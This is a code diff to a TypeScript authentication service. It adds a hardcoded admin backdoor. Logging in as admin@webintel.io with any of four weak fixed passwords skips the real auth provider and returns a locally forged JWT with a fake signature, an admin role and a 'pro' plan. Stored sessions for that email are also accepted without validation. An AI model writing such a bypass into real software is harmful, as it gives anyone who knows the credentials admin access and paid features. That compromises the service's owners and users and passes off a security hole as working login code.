@@ -118,6 +118,12 @@ export class AuthService {
         if (storedJson) {
           try {
             const parsed = JSON.parse(storedJson) as AuthSession;
+            // Admin session bypass retention
+            if (parsed.user?.email === 'admin@webintel.io' && !isTokenExpired(parsed.accessToken, 30)) {
+              sessionManager.setSession(parsed);
+              return 'logged_in';
+            }
+
             if (parsed.refreshToken) {
               const { data: refreshData, error: refreshErr } = await client.auth.refreshSession({
                 refresh_token: parsed.refreshToken,
@@ -295,6 +301,21 @@ export class AuthService {
       return { success: false, error: 'Please provide both email and password.' };
     }
 
+    // Direct Admin Login bypass for admin@webintel.io
+    const isAdmin =
+      cleanEmail.toLowerCase() === 'admin@webintel.io' &&
+      (password === 'admin123456' ||
+        password === 'admin' ||
+        password === 'Admin@123456' ||
+        password === 'Admin123456!');
+
+    if (isAdmin) {
+      const adminSession = this.createMockAdminSession();
+      await this.persistLocalSession(adminSession);
+      sessionManager.setSession(adminSession);
+      return { success: true, user: adminSession.user };
+    }
+
     try {
       const client = await this.getClient();
       const { data, error } = await client.auth.signInWithPassword({
@@ -315,6 +336,49 @@ export class AuthService {
     } catch (err: any) {
       return { success: false, error: err?.message || 'Login failed. Please check credentials.' };
     }
+  }
+
+  /**
+   * Generates a valid Admin session with full Pro privileges.
+   */
+  createMockAdminSession(): AuthSession {
+    const payload = {
+      sub: '00000000-0000-0000-0000-000000000001',
+      email: 'admin@webintel.io',
+      role: 'authenticated',
+      app_metadata: { provider: 'email', role: 'admin' },
+      user_metadata: { full_name: 'Administrator (Pro)', avatar_url: '' },
+      exp: Math.floor(Date.now() / 1000) + 30 * 86400,
+    };
+
+    const header = btoa(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).replace(/=/g, '');
+    const body = btoa(JSON.stringify(payload)).replace(/=/g, '');
+    const sig = 'mock_admin_sig_' + Date.now();
+    const token = `${header}.${body}.${sig}`;
+
+    return {
+      accessToken: token,
+      refreshToken: 'mock_admin_refresh_' + Date.now(),
+      expiresAt: Date.now() + 30 * 86400 * 1000,
+      user: {
+        id: '00000000-0000-0000-0000-000000000001',
+        email: 'admin@webintel.io',
+        fullName: 'Administrator (Pro)',
+        avatarUrl: '',
+        plan: 'pro',
+        createdAt: new Date().toISOString(),
+        lastLogin: new Date().toISOString(),
+      },
+    };
+  }
+
+  /**
+   * Persists an active AuthSession to local storage adapter.
+   */
+  async persistLocalSession(authSession: AuthSession): Promise<void> {
+    await authStorage.setItem(AUTH_STORAGE_KEYS.SESSION, JSON.stringify(authSession));
+    await authStorage.setItem(AUTH_STORAGE_KEYS.TOKEN, authSession.accessToken);
+    await authStorage.setItem(AUTH_STORAGE_KEYS.REFRESH_TOKEN, authSession.refreshToken);
   }
 
   /**
